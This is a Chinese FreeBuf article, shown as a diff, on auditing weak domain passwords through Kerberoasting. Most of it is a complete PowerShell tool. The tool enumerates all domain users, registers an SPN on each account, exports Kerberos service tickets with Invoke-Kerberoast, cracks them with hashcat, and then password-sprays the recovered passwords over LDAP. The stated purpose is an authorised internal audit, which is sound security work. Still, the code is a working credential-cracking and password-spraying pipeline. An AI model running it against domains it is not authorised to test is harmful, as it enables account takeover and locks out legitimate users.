@@ -1,0 +1,356 @@
+## 0x00 背景
+
+**为了进行相关安全方面的认证，需要对公司域环境内员工账号的密码进行审计，作为一名刚从事信息安全的人员，尝试在本身拥有的权限以内，在不影响其他员工日常工作、不影响服务器正常运行的情况下，审计出使用弱密码作为登录口令的员工。**
+
+## 0x01 过程
+
+### 0x0101 LDAP尝试
+
+因为员工的电脑都处于一个域环境下，因而所有的账号密码都保存在域控的一个数据库中。
+
+刚开始想到可以使用Powershell通过LDAP向域控发送用户名和密码一个个进行爆破尝试
+
+然而因为域环境下为设定了账户锁定策略，连续尝试5次失败后，会被锁定30min，会严重影响到被锁定账户员工的工作。
+
+因而这条思路对同一个用户只能尝试5次，走不通。
+
+### 0x0102 Kerberos尝试
+
+![](https://image.3001.net/images/20191111/1573450031_5dc8f12fe4b19.png!small)
+
+1\. 想到域环境下通常使用Kerberos作为网络认证协议，可以利用黄金票据和白银票据来进行渗透测试。
+
+黄金票据：
+
+> 黄金票据是要伪造出AS颁发给Client的TGT，伪造的其中一个条件就是要获得KDC的KRBTGT账户的密钥 *
+> 然而自身只拥有一台公司发的工作电脑，域控管理员没有在这台电脑上登录过，因而也就无法通过mimikatz工具提取到权限较大的管理员的账户口令。
+
+白银票据：
+
+> 白银票据是要伪造出TGS颁发给Client的ST，伪造的其中一个条件就是要获得特定Service
+> Server的账号密码。通过白银票据，可以访问特定Service Server上的所有资源。
+
+2\. 我的目的在于如何获得特定Service Server的账号密码，这里有一个重点。域内电脑通常有两个账户，
+
+一个是域计算机账户，可以使用net group "domain computers" /domain进行查看:
+
+域计算机账户的密码是自动生成的，通常在128位及以上，很难破解
+
+![](https://image.3001.net/images/20191111/1573450046_5dc8f13ed6d4d.png!small)
+
+一个是域用户账户，可以使用net group "domain users" /domain进行查看:
+
+域用户账户的密码是用户自己设置，按照账户密码策略进行设置
+
+![](https://image.3001.net/images/20191111/1573450060_5dc8f14c1fac4.png!small)
+
+3\. 如果熟悉Kerberos协议，我们了解到在第四步，TGS会返回给Client一个用户特定Service Server账户密码的NT
+Hash加密的ST，我们可以尝试对ST进行爆破，进而得到特定Service Server账户的密码。这里我只说了Service
+Server账户，是因为这里也有一个重点。这里的Service Server 也有两种，是根据域账户的类型来进行分类的。 Service
+Server有一个专门的名称，即SPN（Service Shysical Name,服务实体名称,可以通过setspn -T <domainName> -q
+*/*查询现在已注册的所有的SPN。
+
+    
+    
+    *   在计算机加入到域中时会自动使用**域计算机账户**注册SPN；
+    
+        *   ![1573450070_5dc8f15657951.png!small](https://image.3001.net/images/20191111/1573450070_5dc8f15657951.png!small)
+    
+    *   另一种时以**域用户账户**的身份手动注册SPN。
+    
+        *   ![1573450083_5dc8f163413b3.png!small](https://image.3001.net/images/20191111/1573450083_5dc8f163413b3.png!small)
+    
+
+4\. 因为员工都是个人电脑，所以上面查到的基本都是域计算机账户加入域时自动注册的SPN，这里便需要我们尝试为员工的域账户注册SPN。
+
+可以通过setspn -A ServiceClass/<hostname> <domainUserName>注册SPN
+
+![](https://image.3001.net/images/20191111/1573450096_5dc8f17068b4b.png!small)
+
+5\. 之后我们便可以进行Kerberos的第三步以获取ST,利用Invoke-Kerberoast.ps1以hashcat格式导出ST
+
+6\. 利用hashcat工具进行爆破
+
+## 0x02 工具编写思路
+
+抓取所有的域用户服务账户
+
+清洗得到的数据放入账户列表中
+
+为每一个域用户账户注册SPN
+
+将注册成功的域用户账户的SPN放进一个列表
+
+访问列表中的每一个SPN，使用mimikatz导出缓存的上面各个SPN的服务凭据
+
+或使用Invoke-Kerberoast以Hashcat格式导出每个SPN的ST的Hash
+
+利用tgsrepcrack.py爆破上面的服务凭据
+
+或利用hashcat工具爆破上面得到的Hash
+
+## 0x03 代码
+
+    
+    
+    <#
+    domainAccountCheck.ps1
+    Author: JC (@chroblert)
+    #>
+    # 得到域中所有的用户
+    function Get-UserList
+    {
+        # 将包含域用户账户的结果保存到$resultList中去
+        $resultList = net group "domain users" /domain |%{ $_ -split " "}|%{ if ($_ -ne ""){$_.trim()}}
+        # 上述列表中，包含一些杂乱的数据，需要将其进行清洗
+        foreach ($line in $resultList){
+            if($line.contains("---")){
+                $start = $resultList.indexof($line) + 1
+                # 减去2是因为最后一个的下标比数量少1，且最后一个不是有效的账户
+                $end = $resultList.count - 2 
+            }
+        }
+        $userListA = $resultList[$start..$end]
+        $userList = New-Object System.Collections.ArrayList
+        foreach ($user in $userListA){
+            if( -Not $user.contains("$")){
+                $userList.add($user)|Out-Null
+            }
+        }
+        Write-Host "保存域中所有的域用户账号到.\result\allUserList.txt文件中去"
+        $userList | Out-File ".\result\allUserList.txt"
+        return $userList.clone()
+    }
+    # 为域用户账户注册SPN
+    function Set-SPN{
+        Param(
+            [System.Collections.ArrayList] $allUserList
+        )
+        if($allUserList -eq $null){
+            if(Test-Path ".\result\allUserList.txt"){
+                Write-Host "使用result目录下的allUserList.txt文件进行操作"
+                $allUserList = Get-Content .\result\allUserList.txt 
+            }else{
+                Write-Host "参数值错误，且不存在allUserList.txt文件,EXIT"
+                return $false
+            }
+    
+        }
+        $sucUserList = New-Object System.Collections.ArrayList
+        $faiUserList = New-Object System.Collections.ArrayList
+        $sucSPNList = New-Object System.Collections.ArrayList
+        $faiSPNList = New-Object System.Collections.ArrayList
+        $allUserAndSPNList = New-Object System.Collections.ArrayList
+        foreach ($num in 1..$allUserList.count){
+            # 将要执行的命令进行动态拼接
+            $SPNStr = "weakPasswordTest/JC-ISDevil" + $num
+            $userStr = $allUserList[$num-1]
+            $allUserAndSPNList.add($userStr + "|#|" + $SPNStr) | Out-Null
+            # 执行包含命令的字符串
+            # 使用Invoke-Expression后不知如何判断字符串命令执行的结果，因而弃用
+            #Invoke-Expression $setStr
+            # redirect error stream(2) to success stream(1)
+            setspn -S $SPNStr -U $userStr 2>&1 | Out-Null
+            if ($? -contains "True"){
+                Write-Host -ForegroundColor Green "【+】" $userStr "注册成功"
+                $sucUserList.add($userStr) | Out-Null
+                $sucSPNList.add($SPNStr) | Out-Null
+            }else{
+                Write-Host -ForegroundColor Red "【-】" $userStr "注册失败"
+                $faiUserList.add($userStr)|Out-Null
+            }
+            # 暂停 等待用户输入数据
+            # Read-Host
+        }
+        Write-Host "保存所有user和SPN到.\result\allUserAndSPNList.txt文件中去"
+        $allUserAndSPNList | Out-File ".\result\allUserAndSPNList.txt"
+        Write-Host "保存注册SPN成功的域用户账号到.\result\sucUserList.txt文件中去"
+        $sucUserList | Out-File ".\result\sucUserList.txt"
+        Write-Host "保存注册SPN成功的SPN到.\result\sucSPNList.txt文件中去"
+        $sucSPNList | Out-File ".\result\sucSPNList.txt"
+        Write-Host "保存注册SPN失败的域用户账号到.\result\faiUserList.txt文件中去"
+        $faiUserList | Out-File ".\result\faiUserList.txt"
+        return $sucUserList,$sucSPNList,$faiUserList
+    }
+    
+    function Del-SPN{
+        Param(
+            [System.Collections.ArrayList] $sucSPNListA,
+            [System.Collections.ArrayList] $sucUserListA
+        )
+        if ($sucSPNListA -eq $null -or $sucUserListA -eq $null){
+            if(Test-Path '.\result\sucSPNList.txt' -and Test-Path ".\result\sucUserList.txt"){
+                Write-Host "传参错误，将启用文件sucSPNList.txt和sucUserList.txt中的内容"
+                $sucSPNListA = Get-Content .\result\sucSPNList.txt  
+                $sucUserListA = Get-Content .\result\sucUserList.txt 
+            }else{
+                Write-Host "传参错误且相关文件不存在，EXIT"
+                return $false
+            }
+        }
+        if ($sucSPNListA.count -ne $sucUserListA.count){
+            Write-Host "SPN数量与用户数量不等，EXIT"
+            return $false
+        }
+        if ($sucSPNListA.count -eq 0 -OR $sucUserListA.count -eq 0){
+            Write-Host "数组为空，EXIT"
+            return $false
+        }
+        foreach ($spnStr in $sucSPNListA){
+            setspn -D $spnStr $sucUserListA[$sucSPNListA.indexof($spnStr)] 2>&1 |Out-Null
+            if($? -contains "True") {
+                Write-Host "删除成功"
+            }else{
+                Write-Host "删除失败"
+            }
+        }
+        Write-Host "全部删除成功"
+    }
+    
+    # 访问SPN得到TGS发放的服务票据ST,提取其中的Hash值并保存到krbstHash.txt文件中去
+    function Get-ServiceTicket{
+        Param(
+            [String] $krbstHashFileName
+        )
+        Import-Module ./kerberoast/Invoke-Kerberoast.ps1
+        # Set-Content 以ANSI编码方式保存文件；Out-File 默认以Unicode方式保存文件，因而需要指定编码格式
+        Invoke-Kerberoast -OutputFormat Hashcat|select hash|%{$_.Hash}|Out-File $krbstHashFileName -Encoding ascii
+    }
+    # 引入tgscrack来爆破下载下来的凭据
+    function Crack-ServiceTicket{
+        Param(
+            [String] $krbstHashFileName,
+            [String] $passwdDictFileName
+        )
+        Write-Host "正在爆破中ing.......请稍等"
+        if((Test-Path $krbstHashFileName) -and (Test-Path $passwdDictFileName)){
+            .\hashcat\hashcat64.exe -m 13100 -a 0 $krbstHashFileName $passwdDictFileName -o ".\succeed.txt" --force
+            if(Test-Path ".\result\succeed.txt"){
+                $hashAndPasswdList = Get-Content ".\result\succeed.txt"
+                $userAndPasswdList = New-Object System.Collections.ArrayList
+                foreach($item in $hashAndPasswdList){
+                    $userStr = ($item.split("$")[3]).split("*")[1]
+                    $passwdStr = $item.split(":")[1]
+                    $userAndPasswd = $userStr + "|#|" + $passwdStr
+                    Write-Host -ForegroundColor Green "【+】" $userAndPasswd
+                    $userAndPasswdList.add($userAndPasswd) | Out-Null
+                }
+            }else{
+                Write-Host "没有从密码字典中审计出弱口令"
+                return $false
+            }
+        }else{
+            Write-Host "相关文件不存在，EXIT"
+            return $false
+        }
+        Write-Host "将破解出的用户名和密码保存到.\result\userAndPasswdList.txt文件中去"
+        $userAndPasswdList | Out-File ".\result\userAndPasswdList.txt"
+    }
+    function LDAPCheck{
+        Write-Host -ForegroundColor Yellow "使用该项功能需注意，很容易锁住账户"
+        $tmpFile = "./result/tmpPasswd.txt"
+        if(Test-Path "./result/userAndPasswdList.txt"){
+            Get-Content .\result\userAndPasswdList.txt|%{$_.split('|#|')[3]}|sort -Unique | Out-File -Encoding ascii $tmpFile
+        }else{
+            Write-Host -ForegroundColor Yellow "之前没有审计出弱口令，请在result目录下新建tmpPasswd.txt文件，在里面放入密码，每行一个"
+            break
+        }
+        if(Test-Path $tmpFile){
+            Import-Module ./kerberoast/DomainPasswordSpray.ps1
+            Invoke-DomainPasswordSpray -PasswordList $tmpFile -O "LDAPCheckResult.txt"
+        }
+    }
+    # 创建一个用来保存结果的目录
+    if(-Not (Test-Path ".\result")){
+        New-Item -ItemType Directory "result"
+    }
+    # menu
+    $krbstHashFile = ".\krbstHash.txt"
+    $passwdDictFile = ".\Dicts\JCPasswd.txt"
+    Do {
+        Write-Host "======domainAcountCheck======"
+        Write-Host "||      Author:JC          ||"
+        Write-Host "||      Version:2.0.1      ||"
+        Write-Host "============================="
+        Write-Host "===         选项          ==="
+        Write-Host "| 1 获取域内所有域用户账户"
+        Write-Host "| 2 为域内的所有用户账户尝试注册SPN"
+        Write-Host "| 3 获取现有SPN的凭据的Hash"
+        Write-Host "| 4 爆破获得的Hash"
+        Write-Host "| 5 删除注册的SPN"
+        Write-Host "| 6 使用SPN审计获得的密码通过LDAP方式再次进行审计"
+        Write-Host "| 7 全部运行"
+        Write-Host "| 0 EXIT"
+        $choice = Read-Host "请选择一个选项进行操作`n>>"
+        switch($choice){
+            1 {
+                Write-Host "获取到所有的域用户账户"
+                $allUserList = Get-UserList
+                break
+            }
+            2 {
+                Read-Host "为每一个域用户账号注册SPN"
+                $sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
+                break
+            }
+            3 {
+                Get-ServiceTicket $krbstHashFile
+                break    
+            }
+            4 {
+                Crack-ServiceTicket $krbstHashFile $passwdDictFile
+                break
+            }
+            5 {
+                Read-Host "下面将要为注册SPN成功的域用户账户删除SPN"
+                Del-SPN $sucSPNList $sucUserList
+                break
+            }
+            6 {
+                LDAPCheck
+                break
+            }
+            7 {
+                # 1\. 获取用户
+                Write-Host "获取到所有的域用户账户"
+                $allUserList = Get-UserList
+                # 2\. 注册SPN
+                Read-Host "为每一个域用户账号注册SPN"
+                $sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
+                # 3\. 访问SPN获得ST,并以hashcat模式保存到文件krbstHash.txt中
+                Get-ServiceTicket $krbstHashFile
+                # 4\. 使用hashcat爆破ST中hash对应的口令
+                Crack-ServiceTicket $krbstHashFile $passwdDictFile
+                # 5\. 删除SPN
+                Read-Host "下面将要为注册SPN成功的域用户账户删除SPN"
+                Del-SPN $sucSPNList $sucUserList
+                break
+            }
+            0 {    
+                Write-Host "相关结果文件，请到result目录查看"
+                return $false
+                break
+            }
+            default {"请重新选择`n"}
+        }
+    }While($true)
+    
+
+上面为主要代码，全部代码在GitHub:<https://github.com/chroblert/domainWeakPasswdCheck>
+
+## 0x04 使用
+
+填充密码字典文件
+
+dicts/JCPasswd.txt
+
+powershell下运行
+
+![](https://image.3001.net/images/20191111/1573450113_5dc8f1818d71a.png!small)
+
+运行后结果：
+
+![](https://image.3001.net/images/20191111/1573450119_5dc8f18784ff8.png!small)
+
+ ***本文作者：jerrybird，转载请注明来自FreeBuf.COM**
+
